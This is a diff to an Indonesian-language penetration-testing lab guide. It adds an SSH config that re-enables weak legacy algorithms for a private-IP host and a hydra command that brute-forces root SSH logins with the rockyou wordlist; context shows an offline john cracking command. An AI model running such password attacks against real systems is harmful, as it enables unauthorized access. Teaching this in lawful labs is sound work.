@@ -29,7 +29,19 @@ Sebelum memulai, sangat penting untuk menekankan bahwa **semua praktek harus dil
         *   **Perintah:** `john --wordlist=/usr/share/wordlists/rockyou.txt hash_password.txt`
         *   **Analisis:** Bandingkan kecepatan dan silensi serangan offline dengan online. Penyerang tidak perlu terhubung ke target saat cracking.
 
----
+```conf
+Host 10.180.53.85 
+    HostKeyAlgorithms +ssh-rsa,ssh-dss 
+    PubkeyAcceptedKeyTypes +ssh-rsa,ssh-dss 
+    KexAlgorithms +diffie-hellman-group1-sha1,diffie-hellman-group14-sha1 
+    MACs +hmac-md5,hmac-sha1-96,hmac-sha1,umac-64@openssh.com,hmac-ripemd160,hmac-ripemd160@openssh.com,hmac-md5-96
+```
+
+run hydra
+
+```sh
+sudo hydra -V -l root -t 6 ssh://10.180.53.85 -P /usr/share/wordlists/rockyou.txt
+```
 
 ### **Sesi Praktek 2: Buffer Overflow**
 
